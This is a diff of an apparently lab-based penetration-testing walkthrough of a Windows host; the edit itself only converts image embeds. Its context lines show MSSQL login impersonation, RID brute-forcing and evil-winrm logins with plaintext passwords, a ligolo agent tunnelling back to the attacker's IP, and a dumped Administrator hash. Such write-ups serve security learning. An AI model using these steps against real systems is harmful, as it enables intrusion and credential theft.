@@ -20,7 +20,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 port 80 
-![[Pasted image 20260212092510.png]]
+<img src="assets/Pasted image 20260212092510.png">
 
 ##### ffuf 
 ```bash
@@ -67,22 +67,22 @@ SQL (kevin  guest@master)>
 ```
 
 kevin is not usable here .. but theres something 
-![[Pasted image 20260212093955.png]]
+<img src="assets/Pasted image 20260212093955.png">
 
 ```
 EXECUTE AS LOGIN = 'appdev';
 ```
 
-![[Pasted image 20260212094043.png]]
+<img src="assets/Pasted image 20260212094043.png">
 list tables 
 ```
 SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
 ```
 
 we found a hash 
-![[Pasted image 20260212094215.png]]
+<img src="assets/Pasted image 20260212094215.png">
 looking at [hashcat exemple wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)
-![[Pasted image 20260212094502.png]]
+<img src="assets/Pasted image 20260212094502.png">
 the example doesnt quiet aligne with the found hash 
 
 ```
@@ -119,7 +119,7 @@ since mssql only works we can perform an RID attack to get the user s
 nxc mssql 10.129.1.108  -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth 
 ```
 
-![[Pasted image 20260212100317.png]]
+<img src="assets/Pasted image 20260212100317.png">
 we have a list now 
 ```
 jamie.dunn
@@ -138,12 +138,12 @@ we check every protocal and we can actually winrm with it
 evil-winrm -u 'adam.scott' -p 'iloveyou1' -i 10.129.1.108 
 ```
 
-![[Pasted image 20260212100541.png]]
+<img src="assets/Pasted image 20260212100541.png">
 
 ## Post exploitation 
 
 winpeas revealed another iface 
-![[Pasted image 20260212121820.png]]
+<img src="assets/Pasted image 20260212121820.png">
 
 might be the DC01 .. lets pivot to that machine using `ligolo` , i used to prefer `shizel` but this is better 
 
@@ -160,10 +160,10 @@ sudo ip link set ligolo up
 ```
 
 we start the server on our machine 
-![[Pasted image 20260212122118.png]]
+<img src="assets/Pasted image 20260212122118.png">
 then we upload the `agent` and execute it on the target machine 
 
-![[Pasted image 20260212123012.png]]
+<img src="assets/Pasted image 20260212123012.png">
 
 we add the route to the iface now 
 
@@ -171,16 +171,16 @@ we add the route to the iface now
 sudo ip route add 240.0.0.1/32 dev ligolo 
 ```
 
-![[Pasted image 20260212123803.png]]
+<img src="assets/Pasted image 20260212123803.png">
 agent joined , now we start the session 
-![[Pasted image 20260212124002.png]]
+<img src="assets/Pasted image 20260212124002.png">
 and we can connect now
 
 ```powershell
 ./agent.exe -connect 10.10.14.56:11601 -ignore-cert 
 ```
 
-![[Pasted image 20260212124028.png]]
+<img src="assets/Pasted image 20260212124028.png">
 we nmap again the pivoted host and we got this 
 
 ```bash
@@ -273,6 +273,6 @@ Administrator:0x17:0b133be956bfaddf9cea56701affddec
 ```
 
 we evil-winrm now and we get the flag 
-![[Pasted image 20260212130322.png]]
+<img src="assets/Pasted image 20260212130322.png">
 
 
